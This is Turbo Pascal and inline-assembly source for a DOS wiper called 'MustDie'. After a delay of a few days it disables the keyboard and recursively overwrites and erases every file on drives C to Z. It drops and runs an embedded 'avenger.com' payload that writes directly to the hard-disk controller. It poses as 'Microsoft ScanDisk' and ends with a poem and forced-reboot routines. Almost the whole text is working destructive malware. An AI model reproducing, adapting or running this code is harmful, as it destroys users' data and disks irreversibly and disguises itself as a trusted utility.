{$M 65520,120000,120000}
PROGRAM MustDie;
{$I-}

USES DOS, CRT;

TYPE
  PList = ^TList;
  TList = record
    Name : String[12];
    Next : Plist;
    end;

    DrivesSetType = Set of 'A'..'Z';

CONST
     Must : Array [1..16*40+10] of Byte = (
$FA, $B0, $FF, $E6, $21, $B0, $FF, $E6, $A1, $FC, $B9, $06, $00, $BE, $78, $01,
$33, $C0, $8E, $C0, $AC, $C1, $E0, $02, $93, $26, $C7, $07, $65, $01, $26, $8C,
$4F, $02, $E2, $EC, $B0, $80, $BA, $00, $03, $EE, $BA, $F6, $01, $B0, $A0, $EE,
$BA, $F2, $01, $B0, $01, $EE, $BA, $F3, $01, $B0, $01, $EE, $BA, $F4, $01, $B0,
$00, $EE, $BA, $F5, $01, $B0, $00, $EE, $BA, $F7, $01, $B0, $30, $EE, $EC, $A8,
$08, $74, $FB, $B9, $00, $01, $BE, $7E, $01, $BA, $F0, $01, $F3, $6F, $B8, $01,
$0E, $CD, $10, $FA, $F4, $50, $52, $BA, $F7, $01, $EC, $5A, $E6, $E1, $B0, $20,
$E6, $A0, $E6, $E1, $E6, $20, $58, $CF, $0E, $0D, $76, $13, $27, $21, $56, $78,
$20, $2D, $20, $72, $75, $6C, $65, $7A, $20, $21, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
$00, $00, $00, $00, $00, $00, $00, $00, $00, $00);

MustFile = 'c:\avenger.com';

var
  y, m, d, dow : Word;
  ftime : LongInt;
  dt : DateTime;
  f : File of Byte;
  I : Integer;
  SR : SearchRec;
  S : String;
  HD : DrivesSetType;
  Ch : Char;

procedure DeleteFile (S : String);
var
   M : String [79];
begin
     GotoXY (1, WhereY);
     ClrEol;
     M := S;
     if Length (M) > 79 then Delete (M, 79, Length (M));
     if Ch <> 'C' then
        Write (M);
     Assign (f, S);
     ReSet (f);
     if IOResult <> 0 then Exit;
     Close (f);
     if IOResult <> 0 then Exit;
     SetFAttr(f, Archive);
     if IOResult <> 0 then Exit;
     ReSet (f);
     if IOResult <> 0 then Exit;
     Write (f, Must [1], Must [2], Must [3], Must [4], Must [5], Must [6]);
     Seek (f, 0);
     Truncate(f);
     if IOResult <> 0 then Exit;
     Erase (f);
     if IOResult <> 0 then Exit;
end;

procedure ScanDir(stdir:PathStr);
  var
    n,L : PList;
    m : PathStr;
    St : string[79];
    ch : char;
    DIR : DirStr;
    NAM : NameStr;
    EXT : EXTSTR;
begin
  FileMode := 0;
  L := nil;
  if stdir[Length(stdir)] <> '\' then
    stdir:=stdir+'\';
  m := stdir+'*.*';
  FindFirst(m,AnyFile,SR);
  while dosError=0 do begin
    if ((SR.Attr and Directory) <> 0) and ((SR.Name<>'.') and
      (SR.Name<>'..')) then begin
      New(n);
      N^.Next := L;
      N^.Name := SR.Name;
      L := N;
      end
    else
      if (SR.Attr and VolumeID=0) and (SR.Attr and Directory=0) then begin
        S := m;
        Delete (S, Length (m)-2, 3);
        S := S + SR.Name;
        DeleteFile (S);
        end;
    FindNext(sR);
    end;
  while L<> nil do begin
    m := Stdir+L^.Name;
    ChDir(m);
    if IOResult <> 0 then Exit;
    n := L;
    L := L^.next;
    Dispose(n);
    m := m+'\';
    if IOResult = 0 then
    ScanDir(m);
    m := stdir;
    if m[length(m)-1] <> ':' then
      m[0] := chr(length(stdir)-1);
    ChDir(m);
    end;
end;

PROCEDURE Testdrives (VAR Drives : DrivesSetType);
VAR
   R  : Registers;
   i  : Byte;
   Ch : Char;
BEGIN
     Ch := Pred ('A');
     Drives := [];
     for i := 1 to 26 do begin
         Ch := Succ (Ch);
         R.AH := $44;
         R.AL := $08;
         R.BL := i;
         MsDos (R);
         if R.AX <= 1 THEN Drives := Drives + [Ch]
     end;
END;

PROCEDURE ChDrive (Drive : Byte);
BEGIN
     asm
        MOV AH, 0Eh
        MOV DL, Drive;
        INT 21h
     end;
END;

PROCEDURE Reboot1;
BEGIN
  asm
    mov ax,1010h
    out 70h,ax
@b: push dx
    mov al,2
    out 40h,al
    mov al,3
    out 40h,al
    mov dx,3dah
    in al,dx
    mov dl,0c0h
    mov al,33h
    out dx,al
    mov ax,word ptr cs:[offset @g-10h]
    out dx,al
    add al,ah
    test al,8
    je @o08
    not ah
    add al,ah
@o08:
    mov word ptr cs:[offset @g-10h],ax
    pop dx
  mov ax,40h
  mov es,ax
  mov dx,es:[63h]
  in al,40h
  out dx,al
  mov dl,0c0h
  out dx,al
  mov dx,3b4h
  xor al,ah
  sub ah,al
  out dx,ax
  jmp @b
@g: dw 0fffh
  end;
END;

PROCEDURE Reboot2;
BEGIN
          asm
          mov    al, 0FEh
          out    64h, al
          mov    ax, 0FFFFh
          push   ax
          xor    ax, ax
          push   ax
          retf
          end;
END;

BEGIN
     ClrScr;
     Assign (f, ParamStr (0));
     ReSet (f);
     if IOResult <> 0 then Exit;
     GetFTime (f, ftime);
     Close (f);
     UnPackTime (ftime, dt);
     GetDate(y,m,d,dow);
     if d < dt.Day + 2 then Exit;
     asm
     cli
     mov al,0adh
     out 64h,al
     jmp @aaa
@aaa:
     mov ax,1010h
     out 70h,ax
     sti
     end;
     TestDrives (HD);
     FOR Ch := 'C' TO 'Z' DO
         IF Ch in HD THEN BEGIN
            S := Ch + ':';
            ChDrive (ORD(UpCase(S[1]))-65);
            ScanDir(S);
            Assign (f, MustFile);
            ReWrite (f);
            for I := 1 to 16*40+10 do
                Write (f, Must [I]);
            Close (f);
            SwapVectors;
            Exec(MustFile, '');
            SwapVectors;
            Writeln ('Microsoft ScanDisk');
         END;
     ClrScr;
     asm
     cli
     mov al,0aeh
     out 64h,al
     jmp @bbb
@bbb:
     sti
     end;
     WriteLn ('Рыжий клоун, закат, золотистую тучку');
     WriteLn ('Провожает за лес, собирая горем.');
     WriteLn ('Пьяный ветер ласкает черемуху дурочку,');
     WriteLn ('Она отвечает взаимностью всем.');
     repeat until keypressed;
     Reboot1;
     Reboot2;
END.
